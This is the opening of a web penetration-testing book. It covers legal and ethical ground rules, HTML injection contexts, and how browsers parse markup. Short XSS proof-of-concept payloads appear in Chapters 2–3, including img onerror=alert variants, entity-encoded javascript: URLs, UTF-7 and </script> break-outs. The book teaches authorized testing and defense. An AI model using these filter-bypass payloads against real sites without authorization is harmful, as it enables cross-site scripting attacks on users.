<!--
  HTML for Web Penetration Testing — single-file edition
  Auto-generated from the chapter files. For authorized security testing only.
-->

<a id="readme"></a>

# HTML for Web Penetration Testing

> A practical, defense-aware guide to the role HTML plays in finding, exploiting, and fixing web vulnerabilities during **authorized** security assessments.

---

## About this book

Most web vulnerabilities live at the boundary between *data* and *markup*. HTML is the
language that browsers parse, render, and act on — which makes it both the medium that
applications use to talk to users and one of the richest attack surfaces on the web.

This book teaches HTML the way a penetration tester needs to understand it: not just how
to write a valid page, but how browsers actually parse markup, where untrusted data flows
into HTML, how those flows turn into vulnerabilities such as XSS, HTML injection,
clickjacking, and CSRF, and — crucially — how to fix them.

It is written for security professionals, students, bug-bounty hunters, and developers who
want to understand the offensive side of HTML in order to build and test more secure
applications. Every technique in this book is presented for use in **authorized testing
only**. Read [Chapter 1: Legal Foundations and Ethics](#01-legal-and-ethics) before
anything else.

---

## Who this book is for

- **Penetration testers and red-teamers** who want a deep, HTML-centric reference.
- **Developers** who want to understand how their markup becomes an attack surface.
- **Students and certification candidates** (OSCP, eWPT, PNPT, CEH, PortSwigger Academy).
- **Defenders and AppSec engineers** building remediation and detection.

**Prerequisites:** basic familiarity with how the web works (HTTP requests/responses, the
client/server model) and comfort reading code. No prior security experience is required —
foundational concepts are introduced as needed.

---

## How to use this book

The book is organized into six parts that build on each other:

- **Part I** establishes the foundations: HTML through a security lens, how browsers parse
  markup, and the DOM.
- **Part II** maps the attack surface created by forms, inputs, and HTML attributes.
- **Part III** is the core: HTML injection and the three classes of cross-site scripting.
- **Part IV** covers attacks that HTML *enables* — CSRF, clickjacking, HTML5 features,
  dangerous uploads, and SVG/markup tricks.
- **Part V** is methodology, tooling, and hands-on labs.
- **Part VI** turns it around: defense, remediation, and Content Security Policy.

Each chapter follows the same rhythm: **concept → how a browser sees it → how it's abused →
how to detect it → how to fix it.** Beginners should read in order. Experienced testers can
jump to a topic and use the appendices as quick reference.

---

## Table of contents

### Front matter
- [Preface](#00-preface)
- [Chapter 1 — Legal Foundations and Ethics](#01-legal-and-ethics)

### Part I — Foundations
- [Chapter 2 — HTML Refresher for Security Testers](#02-html-refresher)
- [Chapter 3 — How Browsers Parse HTML](#03-browser-parsing)
- [Chapter 4 — The DOM and the Rendering Model](#04-the-dom)

### Part II — Forms, Inputs, and the Attack Surface
- [Chapter 5 — HTML Forms and Input Controls](#05-forms-and-inputs)
- [Chapter 6 — Mapping the HTML Attack Surface](#06-attack-surface)

### Part III — Core HTML-Based Vulnerabilities
- [Chapter 7 — HTML Injection](#07-html-injection)
- [Chapter 8 — Reflected XSS](#08-xss-reflected)
- [Chapter 9 — Stored XSS](#09-xss-stored)
- [Chapter 10 — DOM-Based XSS](#10-xss-dom)

### Part IV — HTML-Enabled Attacks
- [Chapter 11 — CSRF and the Role of HTML Forms](#11-csrf)
- [Chapter 12 — Clickjacking and UI Redressing](#12-clickjacking)
- [Chapter 13 — HTML5 Features and Their Security Impact](#13-html5-features)
- [Chapter 14 — Dangerous Uploads, SVG, and Markup Tricks](#14-uploads-svg-markup)

### Part V — Methodology, Tooling, and Labs
- [Chapter 15 — A Testing Methodology for HTML Vulnerabilities](#15-methodology)
- [Chapter 16 — Tooling: Browser DevTools, Proxies, and Scanners](#16-tooling)
- [Chapter 17 — Hands-On Labs and Exercises](#17-labs)

### Part VI — Defense and Remediation
- [Chapter 18 — Secure Output Handling and Sanitization](#18-defense-remediation)
- [Chapter 19 — Content Security Policy in Depth](#19-csp)

### Appendices
- [Appendix A — Payload and Encoding Cheat Sheets](#A-cheatsheets)
- [Appendix B — Glossary](#B-glossary)
- [Appendix C — References and Further Reading](#C-references)

---

## A note on responsible use

The payloads and techniques in this book work. Use them only against systems you own or are
explicitly authorized in writing to test. Unauthorized testing is illegal in most
jurisdictions and unethical everywhere. See [Chapter 1](#01-legal-and-ethics).

---

## License

This text is provided for educational purposes. You are free to read, share, and learn from
it. The author and contributors accept no liability for misuse.

---

<a id="00-preface"></a>

# Preface

## Why a whole book about HTML for penetration testing?

When people picture a penetration tester, they often imagine someone hammering a server with
exotic exploits. The reality of web testing is quieter and closer to the surface. A huge
share of real-world web vulnerabilities come down to a single recurring mistake: **untrusted
data is placed into an HTML document without being treated as data.** A username appears on a
profile page. A search term is echoed back. A comment is stored and shown to other users. A
URL fragment is read by JavaScript and written into the page. Each of these is an HTML
problem before it is anything else.

HTML is deceptively simple. You can learn enough to build a page in an afternoon. But the
*parsing* rules browsers follow are intricate, forgiving, and full of edge cases — and
attackers live in those edge cases. A tag that looks broken to a human may be silently
"fixed" by the browser into something executable. An attribute boundary you didn't think
about becomes the pivot for an injection. A feature designed for convenience (autofill,
`iframe` embedding, drag-and-drop, `srcdoc`) becomes a lever for abuse.

This book exists because understanding HTML *as the browser understands it* is the difference
between guessing at payloads and reasoning about why a payload works, why one was blocked,
and how to adapt. That reasoning is what separates a scanner from a tester.

## What this book is, and is not

**This book is:**

- A security-focused tour of HTML and the browser model.
- A practical guide to the vulnerability classes that center on HTML: HTML injection, the
  three classes of XSS, clickjacking, CSRF, and HTML5-feature abuse.
- A defender's companion: every offensive chapter ends with detection and remediation.
- Lab-oriented: it points you to legal, intentionally vulnerable practice targets.

**This book is not:**

- A guide to attacking systems you don't own or aren't authorized to test.
- A complete reference for *every* web vulnerability (SQL injection, SSRF, deserialization,
  and so on are mentioned only where HTML intersects them).
- A substitute for the formal scope, rules of engagement, and authorization that every real
  engagement requires.

## How the chapters are structured

Most chapters follow a consistent pattern so you can navigate at the depth you want:

1. **Concept** — what the feature or vulnerability is.
2. **How the browser sees it** — the parsing/rendering behavior that matters.
3. **How it's abused** — concrete, reproducible examples in a lab context.
4. **How to detect it** — what to look for as a tester.
5. **How to fix it** — the remediation a defender should apply.

Code and payloads are shown in fenced blocks. Where a payload could be destructive or noisy,
it is annotated and kept to a harmless proof-of-concept (for example, surfacing `document.domain`
rather than exfiltrating data).

## Conventions

- `monospace` denotes code, markup, payloads, headers, or literal values.
- "The application" or "the target" refers to the in-scope system you are authorized to test.
- "The victim" refers to a simulated user in a lab; in the real world this is a person, and
  that should always inform how you test.
- Lab examples assume a local, disposable, intentionally vulnerable application (see
  [Chapter 17](#17-labs)).

## Acknowledgements and standing on shoulders

The web security community is unusually generous with knowledge. This book leans on the
collective work of OWASP, the PortSwigger Web Security Academy, the WHATWG (which maintains
the HTML standard), browser security teams, and countless researchers who have documented
parser quirks and bypasses over the years. Specific resources are collected in
[Appendix C](#C-references).

Now, before any technique: read the next chapter.

---

<a id="01-legal-and-ethics"></a>

# Chapter 1 — Legal Foundations and Ethics

> **Read this chapter before any other.** Everything that follows assumes you are operating
> with explicit authorization and within a defined scope. The techniques in this book are
> powerful and, used without permission, illegal.

---

## 1.1 The single rule that matters most

**Only test systems you own or have explicit, written authorization to test.**

That is the rule the entire profession rests on. The same HTTP request can be a routine part
of a paid engagement or a criminal act — the only difference is authorization. A skilled
tester is defined less by the payloads they know than by the discipline to stay inside scope.

## 1.2 Why HTML testing feels deceptively harmless (and isn't)

HTML-centric attacks — typing `<script>` into a search box, embedding a site in an `iframe`,
crafting a form that submits cross-site — can feel trivial. There is no "hacking the
mainframe" drama. That low friction is exactly why people get into trouble: it's easy to
"just try" a payload on a live site you don't own.

Don't. Reflecting a payload that pops an alert on someone else's production site is still
unauthorized access in most legal regimes, and a stored payload can harm real users. Treat
HTML attacks with the same seriousness as any other intrusion technique.

## 1.3 The legal landscape (general orientation, not legal advice)

Laws vary by country, and this section is **not legal advice**. Consult a qualified lawyer
for your jurisdiction. That said, most places have computer-misuse statutes that criminalize
unauthorized access to computer systems. Commonly referenced examples include:

- **United States** — the Computer Fraud and Abuse Act (CFAA) and various state laws.
- **United Kingdom** — the Computer Misuse Act.
- **European Union** — national implementations of the Directive on attacks against
  information systems, plus data-protection law (GDPR) when personal data is involved.
- **Many other countries** — analogous "unauthorized access" and "data interference" laws.

The recurring themes across jurisdictions:

1. **Access without authorization is the crime**, independent of harm or intent to profit.
2. **Exceeding authorized access** (testing out of scope) can be treated the same as having
   no authorization at all.
3. **Data protection laws stack on top.** Even authorized testing can create liability if you
   mishandle personal data you encounter.

## 1.4 Authorization in practice

Verbal "go ahead" is not enough. Before testing, make sure you have:

- **A signed contract or engagement letter** with the asset owner.
- **A written scope** listing in-scope domains, IP ranges, applications, and explicitly
  out-of-scope items.
- **Rules of Engagement (RoE):** allowed techniques, time windows, rate limits, data-handling
  rules, and prohibited actions (e.g., no destructive payloads, no social engineering of real
  staff unless agreed).
- **An emergency contact** and an agreed escalation path if you find something critical or
  accidentally cause an outage.
- **A "get out of jail" letter / authorization memo** you can produce if challenged.

If you are doing bug bounty work, the program's **policy page is your scope and RoE.** Read it
in full. "In scope," "out of scope," "safe harbor," and "prohibited testing" sections are
binding. When in doubt, ask the program before testing.

## 1.5 Scope discipline for HTML testing specifically

HTML attacks have a habit of crossing boundaries you didn't intend:

- **Stored XSS reaches other users.** A payload you store in a comment may execute in an
  administrator's browser. That can constitute unauthorized access to *their* session even if
  the app is in scope. Keep stored payloads benign and self-identifying, and clean them up.
- **Cross-site requests reach third parties.** A CSRF or redirect proof-of-concept can fire
  requests at domains outside scope. Make sure your PoC targets only in-scope endpoints.
- **`iframe`/embedding tests can pull in external origins.** Be careful that clickjacking or
  framing demos don't interact with out-of-scope sites.
- **Email/notification triggers.** Injecting markup into a field that later renders in an
  email can spam real people. Confirm such side effects are permitted.

A good habit: **tag every payload** with something identifying, e.g.
`/* pentest-jdoe-2026-05 */` or a unique nonce string, so artifacts are easy to find, attribute,
and remove afterward.

## 1.6 The "non-destructive proof of concept" principle

Your job is to *demonstrate* risk, not to cause damage. Prefer the least invasive PoC that
proves the finding:

- To prove XSS, surface a harmless signal — render `document.domain`, change a heading's text,
  or log to the console — rather than stealing cookies or session tokens. If demonstrating
  impact (e.g., session theft) is required by scope, do it against a test account you control,
  with the client's written agreement, and never against real users.
- To prove CSRF, target a low-impact state change (toggle a non-critical preference) where
  possible.
- To prove clickjacking, show that the page frames and that a click *would* land on a sensitive
  control — you don't need to actually trick a real user.

Document exactly what you did so it can be reproduced and reversed.

## 1.7 Handling data you encounter

During HTML testing you may stumble onto other users' data, internal pages, or secrets.

- **Minimize.** Access only what's necessary to prove the finding.
- **Don't exfiltrate.** Don't pull databases or download personal data "to be thorough."
- **Record carefully.** Screenshots and request/response captures may contain sensitive data;
  store them encrypted and share them only through agreed channels.
- **Report and stop.** If you find evidence of a prior breach or material illegality, follow
  the RoE escalation path immediately.

## 1.8 Responsible disclosure

If you find a vulnerability outside a formal engagement (for example, you stumble on it as a
user), do not test further. Instead:

1. Stop probing.
2. Look for a published security/disclosure policy or `security.txt`.
3. Report privately with enough detail to reproduce.
4. Give the owner reasonable time to fix before any public discussion.
5. Don't demand payment; coordinate, don't coerce.

## 1.9 Building a personal practice lab (the legal way to learn)

You never need someone else's site to practice. Use intentionally vulnerable, self-hosted
targets and public training ranges:

- **OWASP Juice Shop** — modern, deliberately insecure web app.
- **DVWA** (Damn Vulnerable Web Application) — classic teaching app with adjustable difficulty.
- **PortSwigger Web Security Academy** — free, browser-based labs with a legal sandbox.
- **bWAPP, WebGoat, Mutillidae** — additional vulnerable apps.
- **HackTheBox / TryHackMe** — managed legal environments.

[Chapter 17](#17-labs) walks through standing these up. Every payload in this book is
meant to be run against targets like these or systems you are contracted to test.

## 1.10 A short ethics checklist

Before you send a payload, ask:

- [ ] Am I in scope, right now, for this exact asset?
- [ ] Is this the least invasive way to prove the point?
- [ ] Could this payload affect real users or third parties? If so, have I controlled for that?
- [ ] Is my payload tagged and reversible?
- [ ] If someone audited my traffic, could I justify every request?

If any answer is uncomfortable, stop.

---

## Key takeaways

- Authorization is the line between testing and crime. Get it in writing; honor scope.
- HTML attacks cross boundaries easily — to other users, other origins, and out of scope.
  Plan for that.
- Prefer benign, reversible proofs of concept. Demonstrate risk; don't realize it.
- Practice only on systems you own or legal training ranges.

---

<a id="02-html-refresher"></a>

# Chapter 2 — HTML Refresher for Security Testers

> You probably know HTML well enough to build a page. This chapter re-introduces it through
> the only lens that matters for testing: **where does untrusted data go, and what can it
> become once it's there?**

---

## 2.1 HTML is a set of *contexts*, not just tags

The single most useful mental model for HTML security is this: an HTML document is made up of
distinct **contexts**, and the rules for what is "dangerous" change completely depending on
which context a piece of data lands in. The same character — say, `"` or `<` — is harmless in
one context and an injection point in another.

The contexts you must be able to recognize on sight:

1. **HTML element content** — text between tags: `<p>HERE</p>`
2. **HTML attribute value** — inside a tag's attribute: `<img alt="HERE">`
3. **Unquoted attribute value** — `<img alt=HERE>`
4. **URL / `href` / `src` context** — `<a href="HERE">`
5. **Inline event handler** — `<button onclick="HERE">`
6. **Inline `<script>` context** — `<script>var x = "HERE";</script>`
7. **Inline `<style>` / CSS context** — `<div style="HERE">`
8. **Comment context** — `<!-- HERE -->`
9. **Tag name / attribute name context** — `<HERE href=...>`

When you find a reflection (your input showing up in the response), your first job is **not**
to fire payloads — it's to **identify which of these contexts you landed in.** The payload
that works is entirely determined by the context and by what the application did or didn't
encode. We'll return to this constantly; it's the backbone of [Part III](#07-html-injection).

## 2.2 The anatomy of an element

```html
<a href="https://example.com" class="link" data-id="42">Visit</a>
```

- `<a ...>` — the **start tag**.
- `a` — the **tag name** (also called the element name).
- `href`, `class`, `data-id` — **attributes** (name/value pairs).
- `"https://example.com"` — an **attribute value** (here, quoted with double quotes).
- `Visit` — the **text content**.
- `</a>` — the **end tag**.

Security-relevant observations:

- **Attribute values can be quoted with double quotes, single quotes, or left unquoted.** Each
  has a different "escape character" you'd need to break out. Double-quoted: a `"` ends it.
  Single-quoted: a `'` ends it. Unquoted: a space, tab, newline, or several other characters
  end it. Knowing which the app used tells you exactly what character you need to inject.
- **Attribute names are case-insensitive** and **boolean attributes** (`disabled`, `checked`,
  `autofocus`) need no value. `autofocus` in particular is a building block of many XSS payloads
  because it triggers focus-related events without user interaction.
- **`data-*` attributes** hold arbitrary application data and are frequently read by JavaScript
  — a common source of DOM-based issues (see [Chapter 10](#10-xss-dom)).

## 2.3 Document structure

A minimal modern document:

```html
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <title>Example</title>
  </head>
  <body>
    <h1>Hello</h1>
  </body>
</html>
```

Why each part matters to a tester:

- **`<!DOCTYPE html>`** switches the browser into *standards mode*. Its absence triggers
  *quirks mode*, which changes layout and, historically, some security-relevant behaviors.
  You'll occasionally see quirks mode relevant to clickjacking and CSS-based attacks.
- **`<meta charset>`** sets the character encoding. **This is a security control.** If the
  declared charset differs from how the server actually encodes bytes, an attacker can
  sometimes smuggle characters through filters using multibyte/alternate encodings (e.g.,
  UTF-7 in legacy browsers, or charset confusion). Always note the declared charset.
- **`<head>`** is where `<meta>`, `<link>`, `<base>`, and `<script>`/`<style>` often live.
  The `<base href>` element is especially interesting: it rewrites how *relative* URLs on the
  page resolve, so an injected `<base>` can hijack every relative link/resource on a page.
- **`<title>`** is an interesting *reflection sink* because content inside `<title>` is parsed
  in a special way (it's "RCDATA" — more in [Chapter 3](#03-browser-parsing)).

## 2.4 Elements that carry security weight

Some tags matter far more to a tester than others. Keep this short list in your head:

| Element | Why it matters |
|---|---|
| `<script>` | Executes JavaScript. The classic XSS payload host. |
| `<iframe>` | Embeds another document; central to clickjacking and `srcdoc` tricks. |
| `<img>` | `onerror` handler + arbitrary `src` = no-`<script>` XSS and SSRF-ish fetches. |
| `<svg>` | A whole XML island with its own script vectors and event handlers. |
| `<a>` | `href` can be `javascript:` or `data:`; target of open-redirect and tabnabbing. |
| `<form>` | The engine of CSRF; `action`/`formaction` redirection. |
| `<input>` | Wide attack surface via `type`, `value`, `autofocus`, `onfocus`, `formaction`. |
| `<base>` | Rewrites relative URL resolution for the whole page. |
| `<meta>` | `http-equiv="refresh"` enables redirects; CSP can be set here. |
| `<object>`/`<embed>` | Legacy plugin/content embedding; alternative script vectors. |
| `<link>` | Preload/prefetch/stylesheet loading; can leak and can be abused. |
| `<style>` | CSS injection, data exfiltration via selectors, UI redressing. |
| `<template>`,`<noscript>`,`<textarea>` | Special parsing modes that defeat naive filters. |

You don't need to memorize behaviors yet — just recognize that these elements are where the
action is. Each gets detailed treatment later.

## 2.5 Character references (HTML entities) — the heart of output encoding

HTML lets you represent characters by reference so they are treated as *text*, not *markup*:

- Named: `&lt;` (`<`), `&gt;` (`>`), `&amp;` (`&`), `&quot;` (`"`), `&#39;`/`&apos;` (`'`)
- Numeric (decimal): `&#60;` is `<`
- Numeric (hex): `&#x3C;` is `<`

This is the mechanism behind **output encoding**, the primary defense against HTML injection
and XSS. When an application correctly encodes `<` as `&lt;` before placing user data into
HTML element content, the browser renders a literal less-than sign instead of starting a tag.

The crucial subtleties a tester exploits:

- **Encoding must match the context.** HTML-entity encoding protects *element content* and
  *quoted attribute values*, but it does **not** make data safe inside a `<script>` block,
  inside an event handler, or inside a URL. Developers who "HTML-encode everything" still get
  popped because they used the wrong encoding for the context. (We'll exploit exactly this.)
- **Browsers decode entities in many places**, including some attribute values and `href`s.
  That means `javascript&#58;alert(1)` can decode to `javascript:alert(1)` *after* a naive
  filter looked for the literal string `javascript:`.
- **Double-decoding bugs.** If data is decoded twice (once by a framework, once by the
  browser), `&amp;lt;` can become `<`. Layered decoding is a rich source of filter bypasses.

If you take one thing from this chapter, take this: **encoding is context-dependent, and
mismatches between the encoding applied and the context the data lands in are where
vulnerabilities live.**

## 2.6 Comments are not a safe place to hide

```html
<!-- user input here -->
```

Developers sometimes drop data into comments thinking it's inert. But:

- A payload containing `-->` closes the comment early and escapes back into normal parsing.
- Conditional comments and malformed comment syntax have historically had quirky handling.

Treat comments as just another reflection context that can be broken out of.

## 2.7 Raw-text and escapable-raw-text elements

A few elements don't treat their contents as normal HTML:

- **`<script>` and `<style>`** are *raw text* elements. Inside them, `<` does **not** start a
  new tag. The only thing that ends a `<script>` block is the literal sequence `</script`
  (with some nuances covered in [Chapter 3](#03-browser-parsing)). This is why "just strip
  `<` and `>`" fails to secure a value reflected inside a script, and why the real escape route
  out of a script context is often `</script>` itself.
- **`<textarea>` and `<title>`** are *escapable raw text* (RCDATA): they treat `<` as text but
  still decode character references. So `<textarea>` content is safer from tag injection but a
  `</textarea>` sequence breaks out, and entities are still decoded.

These special modes are a recurring theme: **the rules change inside certain elements, and
filters that assume "normal" HTML rules can be bypassed by getting into or out of these
modes.**

## 2.8 Void elements and self-closing confusion

Some elements never have content or an end tag — `<img>`, `<input>`, `<br>`, `<meta>`,
`<link>`, `<hr>`, and others. These are **void elements**. In HTML (as opposed to XML/XHTML),
the self-closing slash `<img />` is allowed but ignored — the element is void regardless.

Why a tester cares: developers and naive sanitizers sometimes reason about HTML as if it were
XML (strict nesting, mandatory closing). Browsers don't. The gap between "how a regex or
XML-minded filter thinks HTML works" and "how the browser actually parses it" is a primary
source of bypasses. Hold that thought — it's the whole point of [Chapter 3](#03-browser-parsing).

## 2.9 URLs inside HTML

Many attributes take a URL: `href`, `src`, `action`, `formaction`, `cite`, `data`,
`poster`, `background`, and more. URLs have their own pseudo-schemes that matter:

- **`javascript:`** — executes script when navigated (e.g., a clicked `<a href="javascript:...">`).
- **`data:`** — inlines content; `data:text/html,...` can host a whole document, and was a
  classic phishing/XSS vector (now restricted for top-level navigation in modern browsers).
- **`vbscript:`** — legacy IE only; effectively dead but appears in old payload lists.
- **`blob:`** and **`filesystem:`** — programmatically created resources.
- **Relative vs absolute** — resolution depends on the document base (and on `<base href>`).

A reflection that lands in a URL context is dangerous in ways that HTML-entity encoding does
**not** fix: `&quot;` won't stop `javascript:alert(1)` from being a valid `href`. URL contexts
need URL-aware validation (scheme allow-listing), which we cover in
[Chapter 18](#18-defense-remediation).

## 2.10 A first taste: the same input, six outcomes

Imagine an application reflects the parameter `q` into different places. Suppose `q` is the
string `"><svg onload=...>` (kept abstract here). Whether anything dangerous happens depends
entirely on context and encoding:

| Where `q` is reflected | Was it encoded? | Result |
|---|---|---|
| `<p>q</p>` | HTML-encoded | Safe — shows as literal text |
| `<p>q</p>` | Not encoded | HTML injection / XSS possible |
| `<input value="q">` | `"` encoded | Safe |
| `<input value="q">` | `"` not encoded | Break out of attribute → XSS |
| `<script>x="q"</script>` | HTML-encoded only | Still XSS — wrong encoding for context |
| `<a href="q">` | HTML-encoded | `javascript:` may still execute → XSS |

Notice that two rows are vulnerable *despite* the developer applying HTML encoding — because
the encoding didn't match the context. Internalize this table; the rest of the book is, in a
sense, an expansion of it.

## 2.11 Tester's HTML reading checklist

When you view source (or proxy a response), scan for:

- [ ] Where does my input appear? (Use a unique marker like `zqxj123`.)
- [ ] What **context** is each reflection in (content / attribute / script / URL / style / comment)?
- [ ] What **encoding**, if any, was applied? Test with `<`, `>`, `"`, `'`, `` ` ``, and see what survives.
- [ ] Are there special parsing modes nearby (`<script>`, `<textarea>`, `<title>`, `<svg>`)?
- [ ] Does the response declare a charset, and does it match the bytes?
- [ ] Is there a `<base>` tag, a CSP header/meta, or framing controls?

This checklist is your first move on every reflection. The next chapter explains *why* it
works — by getting inside the browser's parser.

---

## Key takeaways

- Think in **contexts**, not tags. The danger of a character depends entirely on where it lands.
- **Output encoding is context-specific.** HTML-entity encoding protects element content and
  quoted attributes but not scripts, event handlers, or URLs.
- Certain elements (`<script>`, `<style>`, `<textarea>`, `<title>`, `<svg>`) have special
  parsing rules that break naive filters.
- URL contexts need scheme allow-listing, not entity encoding.
- Always identify context + encoding *before* choosing a payload.

---

<a id="03-browser-parsing"></a>

# Chapter 3 — How Browsers Parse HTML

> Filters and sanitizers fail because their authors imagine a tidier HTML than the one
> browsers actually parse. This chapter gets inside the parser so you can predict what a
> browser will *really* do with your payload — and why so many "clean" inputs still execute.

---

## 3.1 The big idea: HTML parsing is forgiving and that's the problem

HTML is not XML. The HTML standard (maintained by the WHATWG) specifies an extraordinarily
**lenient** parser whose job is to render *something* no matter how broken the markup is.
Missing quotes, missing end tags, mis-nested elements, stray `<` — the parser has a rule for
all of it. Browsers will silently "correct" markup into a valid DOM.

For a tester, this lenience is the gift that keeps giving. Two reasons:

1. **A payload that looks malformed to a human (or a regex) may be repaired by the browser
   into something that executes.** The browser is, in effect, on your side.
2. **Sanitizers that don't parse exactly like a browser will disagree with the browser about
   what the markup means.** Every such disagreement is a potential bypass — this is the root
   cause of an entire class of *mutation XSS* (mXSS) bugs.

## 3.2 The parsing pipeline at a glance

When a browser receives an HTML byte stream it goes through roughly these stages:

```
bytes → [decoding to characters] → [tokenizer] → [tree construction] → DOM
                                       │                │
                                  (states &        (insertion modes &
                                   character          the "stack of
                                   references)        open elements")
```

- **Decoding** turns bytes into characters using the character encoding (the charset). Get the
  charset wrong and everything downstream shifts.
- **Tokenizer** is a *state machine* that reads characters and emits tokens: start tags, end
  tags, text, comments, etc.
- **Tree construction** takes tokens and builds the DOM, applying rules about where elements
  are allowed and auto-correcting when they aren't.

Most "interesting" parser behavior comes from the tokenizer's **states** and the tree
builder's **insertion modes**. You don't need to memorize the spec, but you do need the
intuition.

## 3.3 The tokenizer is a state machine

The tokenizer is always in some *state*, and the current character plus the state decides what
happens next and which state comes after. A few states are worth knowing by name because
payloads live in the transitions between them:

- **Data state** — normal text. A `<` moves toward "tag open."
- **Tag open / tag name states** — after a `<`, the parser decides if this is a start tag, end
  tag, comment, or just stray text.
- **Attribute name / before attribute value / attribute value (double-quoted, single-quoted,
  unquoted) states** — this is where quoting rules come from.
- **RAWTEXT state** (`<style>`, and historically others) — `<` is just text.
- **RCDATA state** (`<textarea>`, `<title>`) — `<` is text, but character references are
  decoded.
- **Script data state** (`<script>`) — special rules (see §3.7).

Two practical consequences:

**(a) A lone `<` is often not a tag.** In the data state, `<` followed by something that isn't
a letter, `/`, `!`, or `?` is treated as literal text. So `a < b` renders fine. Filters that
panic at every `<` over-block; parsers are pickier about what actually opens a tag.

**(b) Whitespace and quoting in attributes are flexible.** The parser accepts spaces, tabs,
newlines, and form feeds as separators, and accepts `=` with surrounding whitespace. This is
why payloads like the following are all equivalent to the browser even though they look odd:

```html
<img src=x onerror=alert(1)>
<img src = x onerror = alert(1)>
<img/src='x'/onerror='alert(1)'>
<img
  src=x
  onerror=alert(1)>
```

The slash as a separator (`<img/src=...>`) surprises people: in the "before attribute name"
state a `/` is consumed and parsing continues, so `/` works as a separator between the tag
name and attributes. Naive filters that split on spaces miss this.

## 3.4 Tree construction: the browser fixes your mess

After tokenizing, the tree builder decides where each node goes. It maintains a *stack of open
elements* and follows *insertion modes* (e.g., "in head," "in body," "in table"). When markup
violates the rules, the builder auto-closes, re-parents, or relocates nodes.

Classic examples a tester should recognize:

- **Implicit tag closing.** `<p>one<p>two` becomes two sibling paragraphs — the first `<p>` is
  auto-closed. Many elements auto-close previous ones.
- **Foster parenting in tables.** Content that isn't allowed inside a `<table>` (like stray
  text or certain elements) gets *moved* out of the table, often to just before it. This
  relocation has produced real mXSS bugs, because a sanitizer parsed the markup in one tree
  shape and the browser produced another.
- **Optional end tags.** `<li>`, `<tr>`, `<td>`, `<option>` and others have optional end tags;
  the parser closes them based on what comes next.
- **Reconstruction of active formatting elements.** Misnested `<b>`, `<i>`, etc. get cloned and
  reopened (the famous "adoption agency algorithm"). The DOM you get is not the markup you
  wrote.

The takeaway: **the DOM is the source of truth, not the bytes.** When you test, look at the
*rendered DOM* (DevTools → Elements), not just "View Source," because the browser may have
transformed your input into something quite different — sometimes into something exploitable.

## 3.5 Mutation XSS (mXSS): when the parser and the sanitizer disagree

This deserves its own section because it's one of the most elegant bypass classes.

A server-side or client-side sanitizer takes attacker HTML, parses it, decides it's safe, and
emits a "clean" string. That string is then assigned to `innerHTML` (or returned in a page)
and **re-parsed by the browser.** If the browser's parsing of the "clean" string differs from
the sanitizer's understanding, the result can be markup the sanitizer never intended to allow.

Drivers of mXSS include:

- **Reserialization quirks.** A sanitizer reads a DOM, serializes it back to a string, and the
  serialization isn't perfectly round-trippable. On re-parse, boundaries shift.
- **Special elements** like `<template>`, `<noscript>`, `<svg>`, `<math>`, `<style>`, and
  tables, whose content models change how nested markup is interpreted. SVG/MathML in
  particular introduce *foreign content* with XML-like rules embedded in HTML — a notorious
  mXSS playground.
- **Entity and encoding edge cases** that decode differently across passes.

You don't need to invent mXSS from scratch as a tester, but you must know it exists, because it
explains why "we use a sanitizer" is not the same as "we're safe," and it tells you to test
sanitizers with *foreign content* and *re-parsing-sensitive* inputs. [Chapter 18](#18-defense-remediation)
covers choosing sanitizers that are hardened against this.

## 3.6 Foreign content: SVG and MathML islands

Inside `<svg>` and `<math>`, the parser switches to *foreign content* rules that are closer to
XML. This changes several things at once:

- **Case sensitivity and self-closing** behave differently than in HTML.
- **New element and attribute names** become meaningful (`<svg><script>`, `<svg><a>` with
  `xlink:href`, animation elements, etc.).
- **CDATA-like and namespace constructs** appear.

Because the rules differ inside these islands, payloads that are impossible in plain HTML can
become possible, and sanitizers frequently mishandle the HTML↔foreign-content boundary. We dig
into concrete SVG vectors in [Chapter 14](#14-uploads-svg-markup).

## 3.7 Inside `<script>`: it's not as raw as you think

`<script>` is a raw-text element, so `<` inside it is text — `if (a<b)` is fine. The naive
mental model is "a script block ends at `</script>`." Reality is subtler, and the subtleties
have been exploited:

- The parser has special **script-data states** that account for the historical interplay
  between `<script>` content and `<!--` / `-->` and the literal sequence `<script` /
  `</script` appearing inside script text.
- This means a value reflected inside a `<script>` block can sometimes be escaped not only with
  `</script>` but via these script-data edge cases.

The defensive lesson (and the offensive opportunity) is the same as Chapter 2's: **HTML-entity
encoding does nothing inside `<script>`.** The browser does not decode `&lt;` inside a script.
So if user data sits in a script context and the developer "encoded" it as HTML, you likely
have an injection — you just need the right script-context break-out, often the literal
`</script>` to close the block and then start fresh markup.

## 3.8 Character references and where they're decoded

From Chapter 2 you know entities like `&#x3C;`. The parser decides *where* to decode them based
on state:

- **Decoded** in the data state (text) and in **attribute value** states (with minor nuances),
  and in **RCDATA** (`<textarea>`, `<title>`).
- **Not decoded** in RAWTEXT (`<style>`) or script data (`<script>`).

This is why `<a href="javascript&#58;alert(1)">` can work: the `&#58;` (a colon) is decoded
*inside the attribute value*, reconstituting `javascript:` *after* a filter that searched for
the literal substring already passed it. Attribute-context entity decoding is one of the most
reliable filter-bypass primitives.

## 3.9 Charset and encoding attacks

Decoding happens before tokenizing, so controlling or confusing the charset can change
everything:

- **Missing/ambiguous charset.** If the server doesn't declare a charset (header or
  `<meta charset>`), the browser may sniff or default, and an attacker who controls early bytes
  may influence the choice. Historically this enabled **UTF-7 XSS**, where `+ADw-` decodes to
  `<` under UTF-7, sailing past filters that looked for `<`. Modern browsers dropped UTF-7
  auto-detection, but charset confusion remains relevant on legacy stacks.
- **Mismatched declared vs actual encoding.** If bytes are UTF-8 but the page claims another
  charset (or vice versa), multibyte sequences can be reinterpreted, occasionally smuggling
  control characters past filters.
- **BOM and overlong encodings.** Edge cases in how byte-order marks and non-canonical UTF-8
  are handled have produced bypasses on older systems.

As a tester: always note the declared charset, try to influence it where the app reflects a
`charset`-like parameter, and remember that filter bypasses sometimes live below the character
level, in the bytes.

## 3.10 `parseFromString`, `innerHTML`, and the template element

Not all HTML parsing happens during the initial page load. JavaScript parses HTML too:

- **`element.innerHTML = str`** parses `str` with the element as context (and *won't* run
  `<script>` inserted this way — but `<img onerror>` and many other vectors still fire).
- **`DOMParser().parseFromString(str, "text/html")`** parses into a detached document.
- **`<template>`** parses its contents into an inert document fragment.

These "fragment parsing" paths have their own context sensitivity (parsing `<td>` inside a
`<div>` context vs a `<table>` context yields different trees) and are central to DOM-based XSS
(Chapter 10) and to sanitizer behavior. Knowing that the same string parses *differently*
depending on the insertion context is, again, the source of many bypasses.

